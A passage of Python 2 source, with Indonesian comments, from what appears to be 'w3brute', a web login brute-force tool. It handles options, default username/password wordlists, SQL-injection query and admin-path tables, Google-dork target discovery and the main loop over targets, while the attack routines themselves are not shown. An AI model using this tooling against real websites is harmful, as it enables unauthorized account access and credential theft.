            memeriksa opsi unik
            dan mengembalikan opsi unik ke opsi normal
            """
            
            for i in xrange(len(argv)):
                option = argv[i]
                if option not in uniqueOptDict.keys():
                    if isUniqueOption(option):
                        raise optparse.BadOptionError(option)
                else:
                    # kembalikan opsi unik ke opsi normal
                    argv[i] = uniqueOptDict[option]
            
            return argv
        
        args = prepareOption(sys.argv)[1:]
        (options, _) = parser.parse_args(args)
        
        if options.version:
            msg = "(%s) %s\n" % (VERSION_STRING, HOMEPAGE)
            cetakData(msg)
            
            raise SystemExit 
        
        if not any([options.targetUrl, options.targetFile, options.googleDork]):
            msg = "you must use option ('-t', '-l' or '-g') "
            msg += "to run w3brute. try '-h' for more information"
            parser.error(msg)
            
            raise SystemExit 
        
        if options.targetUrl \
            and os.path.isfile(options.targetUrl):
                msg = "invalid type: %s (use the '-l' option to load target from file)" % options.targetUrl
                parser.error(msg)
                
                raise SystemExit
        
        opsiVal = (options.targetFile, options.usernames, options.passwords, options.domain, options.adminPaths)
        for _ in opsiVal:
            if _ and is_db(_):
                errMsg = "invalid type: " + _
                parser.error(errMsg)
                
                raise SystemExit
        
        if options.proxy:
            if not options.proxy.startswith(("http://", "https://")):
                parser.error("invalid proxy %s (e.g. http://127.0.0.1:8080/)" % options.proxy)
                
                raise SystemExit
            
            if options.proxyCred \
                and options.proxyCred.count(":") != 1:
                    parser.error("invalid proxy credential %s (e.g. username:password)" % repr(options.proxyCred))
                    
                    raise SystemExit
        
        if options.stopSearch \
            and options.maxSearch:
                msg = "clash option! you have to choose one option ('--stop-search' or '--max-search')"
                parser.error(msg)
                
                raise SystemExit
        
        if options.maxSearch \
            and options.maxSearch <= 1:
                msg = "option value '--max-search' must be greater than 1"
                parser.error(msg)
                
                raise SystemExit
        
        return options
    
    except (optparse.OptionError, optparse.BadOptionError, TypeError), ex:
        parser.error(ex)

# lokasi path (data) w3brute
here = lambda path: os.path.join(os.path.dirname(__file__), path)
wordlist = lambda filename: here("data/wordlist.zip;" + filename)
webdb = lambda table, column: here("data/web.db>%s;%s" % (table, column))

# data tipe autentikasi target
auth = PyDict()

# data untuk daftar kredensial sesuai autentikasi.
credDb = PyDict()

# data pengaturan default
defaults = PyDict(
    agent="w3brute/%s (%s) (%s %s; %s) %s/%s" % (VERSION, HOMEPAGE, os.uname()[0], os.uname()[2], platform.architecture()[0], platform.python_implementation(), platform.python_version()),
    timeout=30,
    retries=5,
    delay=3,
    domain="gmail.com",
    usernames=wordlist("usernames.txt"),
    passwords=wordlist("passwords.txt"),
    sqliQuery=webdb("sqliQuery", "list"),
    adminPaths=webdb("adminPaths", "list"),
    outputDir=here("output/"),
    filename="result",
    fileFormat="csv",
    googlePage=1
)

# data html
html = PyDict()

# data konfigurasi
konf = PyDict()

kredensial = list() # penyimpanan kredensial
pbar = None # lihat :func: bruteForceAttack()
status = PyDict(
    found=bool(), # status informasi jika menemukan akun berpotensi.
    valid=bool() # status informasi jika akun valid (gunakan opsi '--regex-valid').
)

# data target
target = PyDict()

logger = None
stream = None

IS_WIN = subprocess.mswindows

def main():
    """
    fungsi main untuk menjalankan w3brute di terminal
    """
    
    try:
        createLogger()
        banner()
        options = cmdLineParser() # mendapatkan nilai opsi.
        initOptions(options) # menerapkan nilai opsi ke data konfigurasi.
        
        msg = "\n[*] starting at %s\n\n" % time.strftime("%X")
        cetakData(msg)
        
        # mendapatkan daftar target.
        targetList = getTarget()
        
        for (i, url) in enumerate(targetList):
            i += 1
            
            url = url.strip()
            url = completeUrl(url)
            target.URL = url
            
            infoMsg = "[INFO] #%d url: %s\n" % (i, url)
            cetakData(infoMsg)
            
            try: # menjalankan program
                init()
            
            except W3bruteSkipTargetException:
                clearLine()
                
                if not konf.selesai:
                    infoMsg = "[INFO] skipping target %s\n" % repr(str(url))
                    cetakData(infoMsg)
                else:
                    del konf.selesai
             
            # hapus data target sebelumnya.
            clearData() 
    
    except SystemExit:
        konf.lewat = True
    
    except KeyboardInterrupt:
        errMsg = "user aborted"
        logger.error(errMsg)
    
    except W3bruteQuitException:
        pass
    
    except Exception:
        clearLine()
        
        warnMsg = "something out of control happens.\n"
        warnMsg += "=" * getTerminalSize()[0]
        warnMsg += "Running version: %s\n" % VERSION
        warnMsg += "Python version: %s\n" % sys.version.split()[0]
        warnMsg += "Operating system: %s\n" % platform.platform()
        warnMsg += "Command line: %s\n" % re.sub(r".+?w3brute.py\b", "w3brute.py", " ".join(sys.argv))
        warnMsg += "=" * getTerminalSize()[0]
        logger.warning(warnMsg)
        
        errMsg = getErrorMessage()
        logger.error(errMsg)
    
    finally:
        if not konf.lewat:
            msg = "\n[-] shutting down at %s\n\n" % time.strftime("%X")
            cetakData(msg)
        
        if IS_WIN:
            msg = "\n[#] press enter to continue... "
            cetakData(msg)
            raw_input()

if __name__ == "__main__":
    main()